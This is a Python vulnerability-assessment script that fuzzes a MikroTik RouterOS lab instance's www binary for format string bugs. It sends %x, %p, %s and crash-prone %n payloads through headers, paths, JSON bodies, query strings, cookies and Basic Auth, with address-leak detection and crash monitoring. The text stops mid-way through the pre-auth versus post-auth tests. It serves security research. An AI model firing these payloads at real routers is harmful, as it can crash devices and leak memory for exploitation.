#!/usr/bin/env python3
"""
MikroTik RouterOS CHR 7.20.8 -- www Binary Format String Vulnerability Assessment
Phase 9 (Novel Finding Hunting), Script: attack_www_formatstring.py
Target: [REDACTED-INTERNAL-IP] (pristine CHR instance, [REDACTED-CREDS])

Binary context:
  - www binary imports sprintf at PLT 0x804e160
  - Confirmed call sites at 0x8052bcf and 0x805ca6d
  - No stack canary, no NX, no PIE (32-bit x86)
  - A format string reaching sprintf gives info leak (%x/%p) and write (%n) primitives

Tests (~80):
  1. Format specifiers in HTTP headers       (~48 tests)
     - Host, User-Agent, Content-Type, Authorization, Cookie, Accept, Referer, X-Forwarded-For
     - Each header tested with: %x chain, %p chain, %s chain, %n chain (CAUTION),
       structured %08x leak, direct parameter access %1$x
  2. Format specifiers in URL path           (~4 tests)
  3. Format specifiers in JSON body values   (~4 tests)
  4. Format specifiers in query parameters   (~4 tests)
  5. Format specifiers in Cookie values      (~4 tests)
  6. Format specifiers in Basic Auth creds   (~4 tests)
  7. Pre-auth vs post-auth comparison        (~8 tests)
  8. Response analysis across all tests      (continuous)

SAFETY:
  %n tests may crash the router. Uptime is checked before each %n test.
  If a crash is detected, the script waits for recovery, records the crash,
  and continues with non-destructive tests only.

Evidence: evidence/attack_www_formatstring.json
"""

import base64
import json
import re
import socket
import sys
import time
import warnings
from datetime import datetime
from pathlib import Path

import requests
import urllib3

# Suppress SSL / urllib3 warnings
warnings.filterwarnings("ignore")
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ── Shared module ────────────────────────────────────────────────────────────
sys.path.insert(0, '/home/[REDACTED]/Desktop/[REDACTED-PATH]/MikroTik/scripts')
from mikrotik_common import (
    EvidenceCollector, pull_router_logs, pull_logs_before_destructive_action,
    check_router_alive, wait_for_router, log, EVIDENCE_DIR,
)

# ── Target Configuration (override for pristine instance) ───────────────────
TARGET = "[REDACTED-INTERNAL-IP]"
PORT = 80
AUTH = ("admin", "admin")
ADMIN_USER = "admin"
ADMIN_PASS = "admin"
TIMEOUT = 10

HTTP_BASE = f"http://{TARGET}"

# Override the TARGET in mikrotik_common for health checks
import mikrotik_common
mikrotik_common.TARGET = TARGET
mikrotik_common.ADMIN_USER = ADMIN_USER
mikrotik_common.ADMIN_PASS = ADMIN_PASS

ec = EvidenceCollector("attack_www_formatstring.py", phase=9)

# ── State tracking ──────────────────────────────────────────────────────────
CRASH_DETECTED = False  # If True, skip all further %n tests
CRASH_COUNT = 0
BASELINE_RESPONSES = {}  # Cached normal responses for comparison

# ── Format string payloads ──────────────────────────────────────────────────
FMTSTR_PAYLOADS = {
    "info_leak_hex":       "%x%x%x%x%x%x%x%x",
    "info_leak_ptr":       "%p%p%p%p%p%p%p%p",
    "crash_deref":         "%s%s%s%s",
    "write_test":          "%n%n%n%n",
    "structured_leak":     "%08x.%08x.%08x.%08x",
    "direct_param_access": "AAAA%1$x",
}

# Headers to test
TARGET_HEADERS = [
    "Host", "User-Agent", "Content-Type", "Authorization",
    "Cookie", "Accept", "Referer", "X-Forwarded-For",
]

# Patterns indicating a format string leak in response
LEAK_PATTERNS = [
    re.compile(r'0x[0-9a-fA-F]{6,8}'),                    # Pointer notation
    re.compile(r'(?<!\w)[0-9a-fA-F]{8}(?!\w)'),           # Raw 8-char hex blocks
    re.compile(r'\b(?:bf|08|f7|b7)[0-9a-fA-F]{6}\b'),     # Stack/binary/libc addresses
    re.compile(r'[0-9a-fA-F]{8}\.[0-9a-fA-F]{8}'),        # Structured leak dots
    re.compile(r'AAAA[0-9a-fA-F]+'),                       # Direct param canary
]


# ── Helpers ─────────────────────────────────────────────────────────────────

def raw_http(host, port, raw_request, timeout=5):
    """Send a raw HTTP request and return raw response bytes."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        if isinstance(raw_request, str):
            raw_request = raw_request.encode('latin-1')
        s.sendall(raw_request)
        chunks = []
        while True:
            try:
                chunk = s.recv(4096)
                if not chunk:
                    break
                chunks.append(chunk)
            except socket.timeout:
                break
        s.close()
        return b"".join(chunks)
    except Exception as e:
        return None


def http_get(url, auth=None, headers=None, timeout=TIMEOUT):
    """Perform an HTTP GET, return the full Response object or None."""
    try:
        return requests.get(
            url, auth=auth, headers=headers or {},
            timeout=timeout, verify=False, allow_redirects=False)
    except Exception:
        return None


def http_post(url, auth=None, headers=None, data=None, json_data=None, timeout=TIMEOUT):
    """Perform an HTTP POST, return the full Response object or None."""
    try:
        return requests.post(
            url, auth=auth, headers=headers or {},
            data=data, json=json_data,
            timeout=timeout, verify=False, allow_redirects=False)
    except Exception:
        return None


def get_uptime():
    """Get router uptime string via REST API. Returns None if unreachable."""
    try:
        r = requests.get(
            f"http://{TARGET}/rest/system/resource",
            auth=AUTH, timeout=5, verify=False)
        if r.status_code == 200:
            return r.json().get("uptime", "unknown")
    except Exception:
        pass
    return None


def check_crash_after_test(pre_uptime, test_name):
    """Compare uptime before and after a dangerous test. Detect reboot."""
    global CRASH_DETECTED, CRASH_COUNT

    time.sleep(1)  # Brief pause for crash to manifest

    post_uptime = get_uptime()
    if post_uptime is None:
        # Router unreachable -- likely crashed
        log(f"  CRASH DETECTED after '{test_name}': router unreachable!")
        CRASH_DETECTED = True
        CRASH_COUNT += 1
        # Wait for recovery
        recovery = wait_for_router(max_wait=120, check_interval=5)
        return {
            "crash": True,
            "pre_uptime": pre_uptime,
            "post_uptime": None,
            "recovery": recovery,
        }

    # Compare uptime -- if post is less than pre, router rebooted
    if post_uptime and pre_uptime and post_uptime != pre_uptime:
        # Parse uptime to rough seconds for comparison
        pre_secs = _uptime_to_seconds(pre_uptime)
        post_secs = _uptime_to_seconds(post_uptime)
        if pre_secs is not None and post_secs is not None and post_secs < pre_secs:
            log(f"  CRASH/REBOOT DETECTED after '{test_name}': uptime went from {pre_uptime} to {post_uptime}")
            CRASH_DETECTED = True
            CRASH_COUNT += 1
            return {
                "crash": True,
                "pre_uptime": pre_uptime,
                "post_uptime": post_uptime,
                "reboot_detected": True,
            }

    return {"crash": False, "pre_uptime": pre_uptime, "post_uptime": post_uptime}


def _uptime_to_seconds(uptime_str):
    """Parse RouterOS uptime string like '1d2h3m4s' to total seconds."""
    if not uptime_str:
        return None
    total = 0
    try:
        parts = re.findall(r'(\d+)([wdhms])', uptime_str)
        multipliers = {'w': 604800, 'd': 86400, 'h': 3600, 'm': 60, 's': 1}
        for val, unit in parts:
            total += int(val) * multipliers.get(unit, 0)
        return total if total > 0 else None
    except Exception:
        return None


def analyze_response(resp_bytes, resp_obj, payload_name, payload_value):
    """Analyze a response for signs of format string processing.

    Returns a dict with analysis results:
      - leaked_data: list of suspicious patterns found
      - response_anomaly: True if response differs from normal error
      - details: descriptive analysis
    """
    analysis = {
        "leaked_data": [],
        "response_anomaly": False,
        "details": "",
        "response_length": 0,
        "status_code": None,
    }

    # Determine text to analyze
    text = ""
    if resp_bytes:
        try:
            text = resp_bytes.decode('latin-1', errors='replace')
        except Exception:
            text = str(resp_bytes)
        analysis["response_length"] = len(resp_bytes)
    elif resp_obj is not None:
        text = resp_obj.text or ""
        analysis["response_length"] = len(resp_obj.content)
        analysis["status_code"] = resp_obj.status_code

    if not text:
        analysis["details"] = "No response received (timeout or connection refused)"
        return analysis

    # Extract status code from raw response
    if resp_bytes and not analysis["status_code"]:
        status_match = re.search(r'HTTP/\d\.\d\s+(\d+)', text)
        if status_match:
            analysis["status_code"] = int(status_match.group(1))

    # Check for format string leak indicators
    for pat in LEAK_PATTERNS:
        matches = pat.findall(text)
        if matches:
            # Filter out common false positives (HTML color codes, CSS, etc.)
            real_matches = []
            for m in matches:
                m_lower = m.lower()
                # Skip common HTML/CSS hex values
                if m_lower in ('00000000', 'ffffffff', '80000000', 'ffffff',
                               '000000', 'content', 'charset'):
                    continue
                # Skip if it looks like part of an HTML tag or URL
                idx = text.find(m)
                if idx > 0 and text[idx-1] == '#':
                    continue  # Color code
                real_matches.append(m)
            if real_matches:
                analysis["leaked_data"].extend(real_matches[:10])  # Cap at 10

    # Check if payload text appears literally in response (not processed)
    if payload_value in text:
        analysis["details"] += "Payload reflected literally (not interpreted as format). "
    elif any(c in payload_value for c in ['%x', '%p', '%s', '%n', '%08x']):
        # If payload contained format specifiers but they don't appear literally,
        # either they were stripped, caused an error, or were processed
        if len(text) > 0 and payload_value not in text:
            analysis["details"] += "Format specifiers not reflected literally. "

    # Check for binary/non-printable data in response (potential memory leak)
    non_printable = sum(1 for c in text if ord(c) > 127 or (ord(c) < 32 and c not in '\r\n\t'))
    if non_printable > 10:
        analysis["response_anomaly"] = True
        analysis["details"] += f"Response contains {non_printable} non-printable chars (possible memory leak). "
        analysis["leaked_data"].append(f"non_printable_bytes:{non_printable}")

    # Stack address heuristic (32-bit x86)
    stack_addrs = re.findall(r'(?:0x)?(?:bf|BF)[0-9a-fA-F]{6}', text)
    if stack_addrs:
        analysis["response_anomaly"] = True
        analysis["details"] += f"Possible stack addresses found: {stack_addrs[:5]}. "
        analysis["leaked_data"].extend(stack_addrs[:5])

    # Binary base heuristic (no PIE, mapped at 0x0804xxxx)
    binary_addrs = re.findall(r'(?:0x)?0804[0-9a-fA-F]{4}', text)
    if binary_addrs:
        analysis["response_anomaly"] = True
        analysis["details"] += f"Possible binary addresses found: {binary_addrs[:5]}. "
        analysis["leaked_data"].extend(binary_addrs[:5])

    # Libc address heuristic
    libc_addrs = re.findall(r'(?:0x)?(?:f7|b7)[0-9a-fA-F]{6}', text)
    if libc_addrs:
        analysis["response_anomaly"] = True
        analysis["details"] += f"Possible libc addresses found: {libc_addrs[:5]}. "
        analysis["leaked_data"].extend(libc_addrs[:5])

    if analysis["leaked_data"]:
        analysis["response_anomaly"] = True
        analysis["details"] += f"Total {len(analysis['leaked_data'])} leak indicators found."

    if not analysis["details"]:
        analysis["details"] = "No format string processing indicators detected."

    return analysis


def get_baseline_response(path="/", use_auth=False):
    """Get a normal response for comparison (cache results)."""
    key = f"{path}|{use_auth}"
    if key not in BASELINE_RESPONSES:
        try:
            r = requests.get(
                f"http://{TARGET}{path}",
                auth=AUTH if use_auth else None,
                timeout=TIMEOUT, verify=False, allow_redirects=False)
            BASELINE_RESPONSES[key] = {
                "status_code": r.status_code,
                "length": len(r.content),
                "headers": dict(r.headers),
                "body_snippet": r.text[:200],
            }
        except Exception:
            BASELINE_RESPONSES[key] = None
    return BASELINE_RESPONSES[key]


def truncate_for_evidence(text, max_len=500):
    """Truncate text for JSON evidence storage."""
    if not text:
        return ""
    if len(text) <= max_len:
        return text
    return text[:max_len] + f"... [truncated, total {len(text)} chars]"


# =============================================================================
# 1. FORMAT SPECIFIERS IN HTTP HEADERS (~48 tests)
# =============================================================================

def test_header_format_strings():
    """Test format string payloads in each HTTP header."""
    log("=" * 70)
    log("PHASE 1: Format Specifiers in HTTP Headers")
    log("=" * 70)

    # Get baseline
    baseline = get_baseline_response("/webfig/", use_auth=True)
    log(f"  Baseline response: {baseline}")

    test_count = 0
    for header_name in TARGET_HEADERS:
        log(f"\n  --- Testing header: {header_name} ---")

        for payload_name, payload_value in FMTSTR_PAYLOADS.items():
            test_count += 1
            test_id = f"header_{header_name}_{payload_name}"
            is_dangerous = payload_name in ("write_test", "crash_deref")

            # Skip %n tests if crash already detected
            if payload_name == "write_test" and CRASH_DETECTED:
                ec.add_test(
                    category="header_format_string",
                    name=test_id,
                    description=f"{header_name}: {payload_name} (SKIPPED - prior crash)",
                    result="SKIPPED",
                    details={"reason": "Prior crash detected, skipping %n tests"},
                )
                continue

            # For %n tests, record pre-test uptime
            pre_uptime = None
            if payload_name == "write_test":
                pre_uptime = get_uptime()
                if pre_uptime:
                    log(f"    Pre-%n uptime: {pre_uptime}")
                pull_logs_before_destructive_action(f"fmtstr_{test_id}")

            # Build the raw HTTP request with the payload in the target header
            headers_dict = {
                "Host": TARGET,
                "User-Agent": "Mozilla/5.0 MikroTikTest",
                "Accept": "*/*",
                "Connection": "close",
            }

            # Special handling for certain headers
            if header_name == "Authorization":
                # Put format string directly (not base64-encoded -- tested separately)
                headers_dict[header_name] = payload_value
            elif header_name == "Cookie":
                headers_dict[header_name] = f"session={payload_value}"
            else:
                headers_dict[header_name] = payload_value

            # Build raw request
            raw_req = f"GET /webfig/ HTTP/1.1\r\n"
            for k, v in headers_dict.items():
                raw_req += f"{k}: {v}\r\n"
            raw_req += "\r\n"

            # Send via raw socket (preserves format chars exactly)
            resp_raw = raw_http(TARGET, PORT, raw_req, timeout=5)

            # Also try via requests library for comparison (it may URL-encode)
            resp_obj = None
            try:
                req_headers = dict(headers_dict)
                # Remove Host since requests sets it
                req_headers.pop("Host", None)
                resp_obj = requests.get(
                    f"http://{TARGET}/webfig/",
                    headers=req_headers,
                    timeout=TIMEOUT, verify=False, allow_redirects=False)
            except Exception:
                pass

            # Analyze both responses
            analysis_raw = analyze_response(resp_raw, None, payload_name, payload_value)
            analysis_lib = analyze_response(None, resp_obj, payload_name, payload_value)

            # Determine if anomaly
            is_anomaly = analysis_raw["response_anomaly"] or analysis_lib["response_anomaly"]

            # Build result
            result_str = "ANOMALY" if is_anomaly else "NO_LEAK"
            if resp_raw is None and resp_obj is None:
                result_str = "NO_RESPONSE"

            details = {
                "header": header_name,
                "payload_name": payload_name,
                "payload_value": payload_value,
                "raw_socket": {
                    "status_code": analysis_raw["status_code"],
                    "response_length": analysis_raw["response_length"],
                    "leaked_data": analysis_raw["leaked_data"],
                    "anomaly": analysis_raw["response_anomaly"],
                    "details": analysis_raw["details"],
                    "response_snippet": truncate_for_evidence(
                        resp_raw.decode('latin-1', errors='replace') if resp_raw else ""),
                },
                "requests_lib": {
                    "status_code": analysis_lib["status_code"],
                    "response_length": analysis_lib["response_length"],
                    "leaked_data": analysis_lib["leaked_data"],
                    "anomaly": analysis_lib["response_anomaly"],
                    "details": analysis_lib["details"],
                    "response_snippet": truncate_for_evidence(
                        resp_obj.text if resp_obj else ""),
                },
            }

            # Crash check for %n
            if payload_name == "write_test" and pre_uptime:
                crash_info = check_crash_after_test(pre_uptime, test_id)
                details["crash_check"] = crash_info
                if crash_info["crash"]:
                    is_anomaly = True
                    result_str = "CRASH"
                    ec.add_finding(
                        severity="CRITICAL",
                        title=f"Format string %n in {header_name} caused router crash",
                        description=(
                            f"Sending %n%n%n%n in the {header_name} HTTP header "
                            f"caused the router to crash/reboot. Pre-test uptime: "
                            f"{pre_uptime}, post-test uptime: {crash_info.get('post_uptime')}. "
                            f"The www binary (no NX, no canary, no PIE) processed the "
                            f"format string through sprintf, writing to stack addresses."
                        ),
                        evidence_refs=[test_id],
                        cwe="CWE-134",
                        cvss="9.8",
                        reproduction_steps=[
                            f"1. Send HTTP GET to /webfig/ with {header_name}: %n%n%n%n",
                            "2. Router crashes/reboots",
                            "3. Observe uptime reset after recovery",
                        ],
                    )

            # Also check %s crash
            if payload_name == "crash_deref":
                time.sleep(0.5)
                post_alive = check_router_alive(timeout=3)
                if not post_alive.get("alive"):
                    log(f"    %s deref may have crashed router for {header_name}")
                    crash_info = {"crash": True, "method": "deref_crash"}
                    wait_for_router(max_wait=60)
                    details["crash_check"] = crash_info
                    is_anomaly = True
                    result_str = "CRASH"
                    ec.add_finding(
                        severity="CRITICAL",
                        title=f"Format string %s in {header_name} caused router crash",
                        description=(
                            f"Sending %s%s%s%s in the {header_name} HTTP header "
                            f"caused the router to crash. The %s specifier dereferences "
                            f"stack values as string pointers, causing a segfault."
                        ),
                        evidence_refs=[test_id],
                        cwe="CWE-134",
                        cvss="7.5",
                    )

            ec.add_test(
                category="header_format_string",
                name=test_id,
                description=f"{header_name}: {payload_name}",
                result=result_str,
                details=details,
                anomaly=is_anomaly,
            )

            # Small delay between tests
            time.sleep(0.3)

    log(f"\n  Header tests complete: {test_count} tests executed")


# =============================================================================
# 2. FORMAT SPECIFIERS IN URL PATH (~4 tests)
# =============================================================================

def test_url_path_format_strings():
    """Test format string payloads embedded in the URL path."""
    log("=" * 70)
    log("PHASE 2: Format Specifiers in URL Path")
    log("=" * 70)

    path_payloads = [
        ("path_hex_leak",       "/webfig/%x%x%x%x",      "info_leak_hex"),
        ("path_ptr_leak",       "/rest/%p%p%p",            "info_leak_ptr"),
        ("path_write_test",     "/%n",                     "write_test"),
        ("path_structured",     "/AAAA%08x.%08x.%08x",    "structured_leak"),
    ]

    for test_name, path, payload_type in path_payloads:
        is_dangerous = payload_type == "write_test"

        if is_dangerous and CRASH_DETECTED:
            ec.add_test(
                category="url_path_format_string",
                name=test_name,
                description=f"URL path: {path} (SKIPPED - prior crash)",
                result="SKIPPED",
                details={"reason": "Prior crash detected"},
            )
            continue

        pre_uptime = None
        if is_dangerous:
            pre_uptime = get_uptime()
            pull_logs_before_destructive_action(f"fmtstr_{test_name}")

        # Raw socket request (avoids URL encoding)
        raw_req = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {TARGET}\r\n"
            f"User-Agent: MikroTikTest\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        )
        resp_raw = raw_http(TARGET, PORT, raw_req, timeout=5)

        # Also via requests (will URL-encode % chars)
        resp_obj = http_get(f"http://{TARGET}{path}", auth=AUTH)

        analysis_raw = analyze_response(resp_raw, None, test_name, path)
        analysis_lib = analyze_response(None, resp_obj, test_name, path)
        is_anomaly = analysis_raw["response_anomaly"] or analysis_lib["response_anomaly"]

        details = {
            "path": path,
            "payload_type": payload_type,
            "raw_socket": {
                "status_code": analysis_raw["status_code"],
                "response_length": analysis_raw["response_length"],
                "leaked_data": analysis_raw["leaked_data"],
                "anomaly": analysis_raw["response_anomaly"],
                "details": analysis_raw["details"],
                "response_snippet": truncate_for_evidence(
                    resp_raw.decode('latin-1', errors='replace') if resp_raw else ""),
            },
            "requests_lib": {
                "status_code": analysis_lib["status_code"],
                "response_length": analysis_lib["response_length"],
                "leaked_data": analysis_lib["leaked_data"],
                "anomaly": analysis_lib["response_anomaly"],
                "details": analysis_lib["details"],
                "response_snippet": truncate_for_evidence(
                    resp_obj.text if resp_obj else ""),
            },
        }

        result_str = "ANOMALY" if is_anomaly else "NO_LEAK"
        if resp_raw is None and resp_obj is None:
            result_str = "NO_RESPONSE"

        if is_dangerous and pre_uptime:
            crash_info = check_crash_after_test(pre_uptime, test_name)
            details["crash_check"] = crash_info
            if crash_info["crash"]:
                result_str = "CRASH"
                is_anomaly = True
                ec.add_finding(
                    severity="CRITICAL",
                    title=f"Format string %n in URL path caused router crash",
                    description=(
                        f"Sending /%n as the URL path caused the router to crash/reboot. "
                        f"This confirms the www binary processes URL paths through sprintf "
                        f"without sanitizing format specifiers."
                    ),
                    evidence_refs=[test_name],
                    cwe="CWE-134",
                    cvss="9.8",
                )

        ec.add_test(
            category="url_path_format_string",
            name=test_name,
            description=f"URL path format string: {path}",
            result=result_str,
            details=details,
            anomaly=is_anomaly,
        )
        time.sleep(0.3)


# =============================================================================
# 3. FORMAT SPECIFIERS IN JSON BODY VALUES (~4 tests)
# =============================================================================

def test_json_body_format_strings():
    """Test format string payloads in JSON body values (POST to REST API)."""
    log("=" * 70)
    log("PHASE 3: Format Specifiers in JSON Body Values")
    log("=" * 70)

    json_payloads = [
        ("json_hex_leak",    {"note": "%x%x%x%x%x%x%x%x"},        "info_leak_hex"),
        ("json_ptr_leak",    {"note": "%p%p%p%p%p%p%p%p"},         "info_leak_ptr"),
        ("json_structured",  {"note": "%08x.%08x.%08x.%08x"},      "structured_leak"),
        ("json_direct",      {"note": "AAAA%1$x%2$x%3$x%4$x"},    "direct_param_access"),
    ]

    for test_name, json_body, payload_type in json_payloads:
        # POST to /rest/system/note/set
        resp_obj = http_post(
            f"http://{TARGET}/rest/system/note/set",
            auth=AUTH,
            json_data=json_body,
        )

        # Also read it back to see if format was processed during storage
        resp_readback = http_get(
            f"http://{TARGET}/rest/system/note",
            auth=AUTH,
        )

        analysis = analyze_response(None, resp_obj, test_name, json_body.get("note", ""))
        analysis_readback = analyze_response(
            None, resp_readback, test_name + "_readback", json_body.get("note", ""))

        is_anomaly = analysis["response_anomaly"] or analysis_readback["response_anomaly"]

        # Check if the note was stored with format specifiers processed
        stored_value = None
        if resp_readback and resp_readback.status_code == 200:
            try:
                readback_data = resp_readback.json()
                if isinstance(readback_data, dict):
                    stored_value = readback_data.get("note", readback_data.get("show-at-login", ""))
                elif isinstance(readback_data, list) and len(readback_data) > 0:
                    stored_value = readback_data[0].get("note", "")
            except Exception:
                stored_value = resp_readback.text[:200]

        # If stored value differs from input, format string was processed
        input_value = json_body.get("note", "")
        if stored_value and stored_value != input_value and stored_value.strip():
            is_anomaly = True
            analysis["details"] += (
                f" Stored value differs from input! Input='{input_value}', "
                f"Stored='{stored_value}'. Format string may have been processed."
            )

        details = {
            "json_body": json_body,
            "payload_type": payload_type,
            "set_response": {
                "status_code": analysis["status_code"],
                "response_length": analysis["response_length"],
                "leaked_data": analysis["leaked_data"],
                "details": analysis["details"],
                "response_snippet": truncate_for_evidence(
                    resp_obj.text if resp_obj else ""),
            },
            "readback_response": {
                "status_code": analysis_readback["status_code"],
                "stored_value": truncate_for_evidence(str(stored_value) if stored_value else ""),
                "leaked_data": analysis_readback["leaked_data"],
                "details": analysis_readback["details"],
                "response_snippet": truncate_for_evidence(
                    resp_readback.text if resp_readback else ""),
            },
        }

        result_str = "ANOMALY" if is_anomaly else "NO_LEAK"
        ec.add_test(
            category="json_body_format_string",
            name=test_name,
            description=f"JSON body format string: {payload_type}",
            result=result_str,
            details=details,
            anomaly=is_anomaly,
        )
        time.sleep(0.3)

    # Clean up: reset the note to empty
    try:
        http_post(
            f"http://{TARGET}/rest/system/note/set",
            auth=AUTH,
            json_data={"note": ""},
        )
    except Exception:
        pass


# =============================================================================
# 4. FORMAT SPECIFIERS IN QUERY PARAMETERS (~4 tests)
# =============================================================================

def test_query_param_format_strings():
    """Test format string payloads in URL query parameters."""
    log("=" * 70)
    log("PHASE 4: Format Specifiers in Query Parameters")
    log("=" * 70)

    query_payloads = [
        ("query_hex_leak",     "/webfig/?foo=%x%x%x%x",            "%x%x%x%x"),
        ("query_ptr_leak",     "/rest/system/resource?%p=%p",       "%p=%p"),
        ("query_structured",   "/webfig/?q=%08x.%08x.%08x.%08x",   "%08x.%08x.%08x.%08x"),
        ("query_direct",       "/webfig/?x=AAAA%1$x",              "AAAA%1$x"),
    ]

    for test_name, full_path, payload_value in query_payloads:
        # Raw socket (no URL encoding)
        raw_req = (
            f"GET {full_path} HTTP/1.1\r\n"
            f"Host: {TARGET}\r\n"
            f"User-Agent: MikroTikTest\r\n"
            f"Authorization: Basic {base64.b64encode(b'admin:admin').decode()}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        )
        resp_raw = raw_http(TARGET, PORT, raw_req, timeout=5)

        # Via requests
        resp_obj = http_get(f"http://{TARGET}{full_path}", auth=AUTH)

        analysis_raw = analyze_response(resp_raw, None, test_name, payload_value)
        analysis_lib = analyze_response(None, resp_obj, test_name, payload_value)
        is_anomaly = analysis_raw["response_anomaly"] or analysis_lib["response_anomaly"]

        details = {
            "path": full_path,
            "payload_value": payload_value,
            "raw_socket": {
                "status_code": analysis_raw["status_code"],
                "response_length": analysis_raw["response_length"],
                "leaked_data": analysis_raw["leaked_data"],
                "anomaly": analysis_raw["response_anomaly"],
                "details": analysis_raw["details"],
                "response_snippet": truncate_for_evidence(
                    resp_raw.decode('latin-1', errors='replace') if resp_raw else ""),
            },
            "requests_lib": {
                "status_code": analysis_lib["status_code"],
                "response_length": analysis_lib["response_length"],
                "leaked_data": analysis_lib["leaked_data"],
                "anomaly": analysis_lib["response_anomaly"],
                "details": analysis_lib["details"],
                "response_snippet": truncate_for_evidence(
                    resp_obj.text if resp_obj else ""),
            },
        }

        result_str = "ANOMALY" if is_anomaly else "NO_LEAK"
        ec.add_test(
            category="query_param_format_string",
            name=test_name,
            description=f"Query param format string: {full_path}",
            result=result_str,
            details=details,
            anomaly=is_anomaly,
        )
        time.sleep(0.3)


# =============================================================================
# 5. FORMAT SPECIFIERS IN COOKIE VALUES (~4 tests)
# =============================================================================

def test_cookie_format_strings():
    """Test format string payloads in Cookie header values."""
    log("=" * 70)
    log("PHASE 5: Format Specifiers in Cookie Values")
    log("=" * 70)

    cookie_payloads = [
        ("cookie_hex_leak",    "session=%x%x%x%x%x%x%x%x; id=test",         "%x chain in session cookie"),
        ("cookie_ptr_leak",    "session=%p%p%p%p; id=%p%p",                   "%p in session and id cookies"),
        ("cookie_structured",  "session=%08x.%08x.%08x; path=%08x",          "%08x structured in cookies"),
        ("cookie_direct",      "session=AAAA%1$x; id=BBBB%2$x",             "Direct param access in cookies"),
    ]

    for test_name, cookie_value, description in cookie_payloads:
        # Raw socket
        raw_req = (
            f"GET /webfig/ HTTP/1.1\r\n"
            f"Host: {TARGET}\r\n"
            f"User-Agent: MikroTikTest\r\n"
            f"Cookie: {cookie_value}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        )
        resp_raw = raw_http(TARGET, PORT, raw_req, timeout=5)

        # Via requests
        # Build a proper cookie dict for requests
        resp_obj = None
        try:
            session = requests.Session()
            session.cookies.set("session", cookie_value.split("session=")[1].split(";")[0])
            resp_obj = session.get(
                f"http://{TARGET}/webfig/",
                timeout=TIMEOUT, verify=False, allow_redirects=False)
        except Exception:
            resp_obj = http_get(
                f"http://{TARGET}/webfig/",
                headers={"Cookie": cookie_value})

        analysis_raw = analyze_response(resp_raw, None, test_name, cookie_value)
        analysis_lib = analyze_response(None, resp_obj, test_name, cookie_value)
        is_anomaly = analysis_raw["response_anomaly"] or analysis_lib["response_anomaly"]

        details = {
            "cookie_value": cookie_value,
            "description": description,
            "raw_socket": {
                "status_code": analysis_raw["status_code"],
                "response_length": analysis_raw["response_length"],
                "leaked_data": analysis_raw["leaked_data"],
                "anomaly": analysis_raw["response_anomaly"],
                "details": analysis_raw["details"],
                "response_snippet": truncate_for_evidence(
                    resp_raw.decode('latin-1', errors='replace') if resp_raw else ""),
            },
            "requests_lib": {
                "status_code": analysis_lib["status_code"],
                "response_length": analysis_lib["response_length"],
                "leaked_data": analysis_lib["leaked_data"],
                "anomaly": analysis_lib["response_anomaly"],
                "details": analysis_lib["details"],
                "response_snippet": truncate_for_evidence(
                    resp_obj.text if resp_obj else ""),
            },
        }

        result_str = "ANOMALY" if is_anomaly else "NO_LEAK"
        ec.add_test(
            category="cookie_format_string",
            name=test_name,
            description=description,
            result=result_str,
            details=details,
            anomaly=is_anomaly,
        )
        time.sleep(0.3)


# =============================================================================
# 6. FORMAT SPECIFIERS IN BASIC AUTH CREDENTIALS (~4 tests)
# =============================================================================

def test_basic_auth_format_strings():
    """Test format string payloads in Base64-encoded Basic Auth credentials."""
    log("=" * 70)
    log("PHASE 6: Format Specifiers in Basic Auth Credentials")
    log("=" * 70)

    auth_payloads = [
        ("basicauth_user_hex",   "%x%x%x%x:password",        "Format string in username"),
        ("basicauth_pass_ptr",   "admin:%p%p%p%p",            "Format string in password"),
        ("basicauth_user_struct", "%08x.%08x.%08x:test",      "Structured leak in username"),
        ("basicauth_both",       "%x%x%x:%p%p%p",            "Format string in both user and pass"),
    ]

    for test_name, cred_string, description in auth_payloads:
        b64_creds = base64.b64encode(cred_string.encode()).decode()

        # Raw socket with Basic Auth header
        raw_req = (
            f"GET /webfig/ HTTP/1.1\r\n"
            f"Host: {TARGET}\r\n"
            f"User-Agent: MikroTikTest\r\n"
            f"Authorization: Basic {b64_creds}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        )
        resp_raw = raw_http(TARGET, PORT, raw_req, timeout=5)

        # Also try via requests
        user_part = cred_string.split(":")[0]
        pass_part = ":".join(cred_string.split(":")[1:])
        resp_obj = http_get(
            f"http://{TARGET}/webfig/",
            auth=(user_part, pass_part))

        analysis_raw = analyze_response(resp_raw, None, test_name, cred_string)
        analysis_lib = analyze_response(None, resp_obj, test_name, cred_string)
        is_anomaly = analysis_raw["response_anomaly"] or analysis_lib["response_anomaly"]

        details = {
            "credential_string": cred_string,
            "base64_encoded": b64_creds,
            "description": description,
            "raw_socket": {
                "status_code": analysis_raw["status_code"],
                "response_length": analysis_raw["response_length"],
                "leaked_data": analysis_raw["leaked_data"],
                "anomaly": analysis_raw["response_anomaly"],
                "details": analysis_raw["details"],
                "response_snippet": truncate_for_evidence(
                    resp_raw.decode('latin-1', errors='replace') if resp_raw else ""),
            },
            "requests_lib": {
                "status_code": analysis_lib["status_code"],
                "response_length": analysis_lib["response_length"],
                "leaked_data": analysis_lib["leaked_data"],
                "anomaly": analysis_lib["response_anomaly"],
                "details": analysis_lib["details"],
                "response_snippet": truncate_for_evidence(
                    resp_obj.text if resp_obj else ""),
            },
        }

        result_str = "ANOMALY" if is_anomaly else "NO_LEAK"
        ec.add_test(
            category="basicauth_format_string",
            name=test_name,
            description=description,
            result=result_str,
            details=details,
            anomaly=is_anomaly,
        )
        time.sleep(0.3)


# =============================================================================
# 7. PRE-AUTH vs POST-AUTH COMPARISON (~8 tests)
# =============================================================================

def test_preauth_vs_postauth():
    """Compare format string handling with and without authentication.

    Tests key payloads against both /webfig/ and /rest/ endpoints,
    once without auth and once with admin:admin, to see if the format
    string processing path differs.
    """
    log("=" * 70)
    log("PHASE 7: Pre-Auth vs Post-Auth Format String Comparison")
    log("=" * 70)

    comparison_tests = [
        {
            "name": "prepost_webfig_hex",
            "path": "/webfig/",
            "header": "User-Agent",
            "payload": "%x%x%x%x%x%x%x%x",
        },
        {
            "name": "prepost_webfig_ptr",
            "path": "/webfig/",
            "header": "User-Agent",
            "payload": "%p%p%p%p%p%p%p%p",
        },
        {
            "name": "prepost_rest_hex",
            "path": "/rest/system/resource",
            "header": "User-Agent",
            "payload": "%x%x%x%x%x%x%x%x",
